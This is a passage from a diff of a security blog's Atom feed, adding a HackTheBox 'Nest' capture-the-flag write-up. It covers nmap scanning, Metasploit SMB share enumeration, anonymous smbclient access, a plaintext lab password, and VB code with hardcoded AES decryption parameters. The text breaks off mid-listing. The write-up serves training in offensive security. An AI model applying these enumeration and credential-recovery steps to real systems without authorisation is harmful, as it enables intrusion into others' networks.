@@ -1,5 +1,644 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-05-31T10:45:00+02:00</updated><entry><title>HTB: Resolute</title><link href="https://maggick.fr/2020/05/htb-resolute.html" rel="alternate"></link><published>2020-05-31T10:45:00+02:00</published><updated>2020-05-31T10:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-31:/2020/05/htb-resolute.html</id><summary type="html">&lt;p&gt;&lt;img alt="Resolute Card" class="align-left" src="/media/2020.05/resolute_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-06-07T17:25:00+02:00</updated><entry><title>HTB: Nest</title><link href="https://maggick.fr/2020/06/htb-nest.html" rel="alternate"></link><published>2020-06-07T17:25:00+02:00</published><updated>2020-06-07T17:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-07:/2020/06/htb-nest.html</id><summary type="html">&lt;p&gt;&lt;img alt="Nest card" class="align-left" src="/media/2020.06/nest_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/225"&gt;Nest&lt;/a&gt;
+This box is classified as an easy machine. It was publish on January the 25th by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
+This box is a bit different that the other ones on HTB. Until the last step you
+never have a shell on the box (and none is needed to root it). All commands and
+enumeration are done on the SMB service. There is also a personnalized service
+HQK.&lt;/p&gt;
+&lt;p&gt;Getting user involve understanding a bit of cryptography (homemade combination
+of base64 and AES) but nothing too complexe.&lt;/p&gt;
+&lt;p&gt;Getting root required to decompile some .NET executable to get some parameter
+for the homemade encryption.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.06/nest_card.png" alt="Nest card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/225"&gt;Nest&lt;/a&gt;
+This box is classified as an easy machine. It was publish on January the 25th by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
+This box is a bit different that the other ones on HTB. Until the last step you
+never have a shell on the box (and none is needed to root it). All commands and
+enumeration are done on the SMB service. There is also a personnalized service
+HQK.&lt;/p&gt;
+&lt;p&gt;Getting user involve understanding a bit of cryptography (homemade combination
+of base64 and AES) but nothing too complexe.&lt;/p&gt;
+&lt;p&gt;Getting root required to decompile some .NET executable to get some parameter
+for the homemade encryption.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 445 (SMB) and 4386 are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Jan 27 03:59:58 2020 as: nmap -p- -sS -oA nmap_p 10.10.10.178&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.178&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.26s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp  open  microsoft-ds&lt;/span&gt;
+&lt;span class="code-line"&gt;4386/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Mon Jan 27 04:08:04 2020 -- 1 IP address (1 host up) scanned in 485.47 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="hqk-reporting-service"&gt;HQK Reporting Service&lt;/h2&gt;
+&lt;p&gt;We connect to the port 4386 using telnet. This service allow us to list the
+files on the system but nothing more. The &lt;code&gt;DEBUG&lt;/code&gt; function seems interesting but
+we need a password for it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#telnet 10.10.10.178 4386&lt;/span&gt;
+&lt;span class="code-line"&gt;Trying 10.10.10.178...&lt;/span&gt;
+&lt;span class="code-line"&gt;Connected to 10.10.10.178.&lt;/span&gt;
+&lt;span class="code-line"&gt;Escape character is &amp;#39;^]&amp;#39;.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HQK Reporting Service V1.2&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;help&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;This service allows users to run queries against databases using the legacy HQK format&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- AVAILABLE COMMANDS ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;LIST&lt;/span&gt;
+&lt;span class="code-line"&gt;SETDIR &amp;lt;Directory_Name&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;RUNQUERY &amp;lt;Query_ID&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG &amp;lt;Password&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HELP &amp;lt;Command&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;SETDIR C:\Users\&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current directory set to Users&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;LIST&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt; QUERY FILES IN CURRENT DIRECTORY&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  Administrator&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  All Users&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  Default&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  Default User&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  Public&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  Service_HQK&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  TempUser&lt;/span&gt;
+&lt;span class="code-line"&gt;[1]   desktop.ini&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current Directory: Users&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="smb"&gt;SMB&lt;/h2&gt;
+&lt;p&gt;We enumerate the shares on the SMB server using metasploit. The share &lt;code&gt;Data&lt;/code&gt;
+seems interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; use auxiliary/scanner/smb/smb_enumshares&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumshares) &amp;gt; set RHOSTS 10.10.10.178&lt;/span&gt;
+&lt;span class="code-line"&gt;RHOSTS =&amp;gt; 10.10.10.178&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumshares) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - ADMIN$ - (DISK) Remote Admin&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - C$ - (DISK) Default share&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - Data - (DISK)&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - IPC$ - (IPC) Remote IPC&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - Secure$ - (DISK)&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - Users - (DISK)&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.178:         - Scanned 1 of 1 hosts (100% complete)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We connect to this share anonymously and start to enumerate the folder and files
+on the share. We quickly find a "Welcome Email" in the HR templates folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/Data -U &amp;quot; &amp;quot;%&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commands.&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \&amp;gt; cd Shared\Templates\HR&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \Shared\Templates\HR\&amp;gt; mget &amp;quot;Welcome Email.txt&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Get file Welcome Email.txt? y&lt;/span&gt;
+&lt;span class="code-line"&gt;getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This template email contain the username "TempUser" and its password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# cat Welcome\ Email.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;We would like to extend a warm welcome to our newest member of staff, &amp;lt;FIRSTNAME&amp;gt; &amp;lt;SURNAME&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;You will find your home folder in the following location:&lt;/span&gt;
+&lt;span class="code-line"&gt;\\HTB-NEST\Users\&amp;lt;USERNAME&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;If you have any issues accessing specific services or workstations, please inform the&lt;/span&gt;
+&lt;span class="code-line"&gt;IT department and use the credentials below until all systems have been set up for you.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Username: TempUser&lt;/span&gt;
+&lt;span class="code-line"&gt;Password: welcome2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Thank you&lt;/span&gt;
+&lt;span class="code-line"&gt;HR&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="sbm-as-tempuser"&gt;SBM as TempUser&lt;/h2&gt;
+&lt;p&gt;We can then connect to the SMB share using our "TempUser". We found a lot of
+configuration files. The &lt;code&gt;RU_config.xml&lt;/code&gt; contain what seems to be a base64
+password for the c.smith user. We try to decode it using &lt;code&gt;base64 -d&lt;/code&gt; but the result is not printable
+characters.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# cat RU_config.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;ConfigFile xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Port&amp;gt;389&amp;lt;/Port&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Username&amp;gt;c.smith&amp;lt;/Username&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Password&amp;gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&amp;lt;/Password&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/ConfigFile&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Looking a bit more at the files we found the NotepadPlusPlus configuration file
+containing the history of the recently edited files. The
+&lt;code&gt;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&lt;/code&gt; seems to be interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#tail config.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;Find name=&amp;quot;redeem on&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;Find name=&amp;quot;192&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;Replace name=&amp;quot;C_addEvent&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/FindHistory&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;History nbMaxFile=&amp;quot;15&amp;quot; inSubMenu=&amp;quot;no&amp;quot; customLength=&amp;quot;-1&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;File filename=&amp;quot;C:\windows\System32\drivers\etc\hosts&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;File filename=&amp;quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;File filename=&amp;quot;C:\Users\C.Smith\Desktop\todo.txt&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/History&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/NotepadPlus&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We connect to the "Secure$" share and go to Carl's folder. The Temp.txt doesn't
+exist anymore but we found some visual basic code in a WIP folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/Secure$ -U &amp;quot;TempUser&amp;quot;%&amp;quot;welcome2019&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&amp;gt; dir&lt;/span&gt;
+&lt;span class="code-line"&gt;.                                   D        0  Wed Aug  7 18:05:54 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;..                                  D        0  Wed Aug  7 18:05:54 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;bin                                 D        0  Wed Aug  7 16:00:11 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;ConfigFile.vb                       A      772  Wed Aug  7 18:05:09 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;Module1.vb                          A      279  Wed Aug  7 18:05:44 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;My Project                          D        0  Wed Aug  7 16:00:11 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;obj                                 D        0  Wed Aug  7 16:00:11 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;RU Scanner.vbproj                   A     4828  Fri Aug  9 11:37:51 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;RU Scanner.vbproj.user              A      143  Tue Aug  6 08:55:27 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;SsoIntegration.vb                   A      133  Wed Aug  7 18:05:58 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;Utils.vb                            A     4888  Wed Aug  7 15:49:35 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We download everything on our computer. The "Module1.vb" file is a module
+loading a XML file "RU_config.xml" and using the Utils library to decode the
+password stored in the file. We already have the XML file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Module&lt;/span&gt; &lt;span class="nn"&gt;Module1&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Sub&lt;/span&gt; &lt;span class="nf"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;Config&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;ConfigFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ConfigFile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LoadFromFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;RU_Config.xml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;test&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;SsoIntegration&lt;/span&gt; &lt;span class="k"&gt;With&lt;/span&gt; &lt;span class="p"&gt;{.&lt;/span&gt;&lt;span class="n"&gt;Username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Config&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Utils&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DecryptString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Config&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Sub&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Module&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The "Utils.vb" file contain the decrypting methods and the passphrase, the salt
+value, the number of password iteration, the initialisation vector (for CBC mode)
+and the key size.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Imports&lt;/span&gt; &lt;span class="nn"&gt;System.Text&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;Imports&lt;/span&gt; &lt;span class="nn"&gt;System.Security.Cryptography&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Class&lt;/span&gt; &lt;span class="nc"&gt;Utils&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Shared&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="nf"&gt;GetLogFilePath&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Combine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CurrentDirectory&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Log.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Shared&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="nf"&gt;DecryptString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EncryptedString&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;If&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EncryptedString&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;Then&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Empty&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Else&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EncryptedString&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;N3st22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;88552299&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;464R5DFA5DL6LE28&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;If&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Shared&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="nf"&gt;EncryptString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PlainString&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;If&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PlainString&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;Then&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Empty&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Else&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;Encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PlainString&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;N3st22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;88552299&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;464R5DFA5DL6LE28&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;If&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Shared&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="nf"&gt;Encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;plainText&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;passPhrase&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;saltValue&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
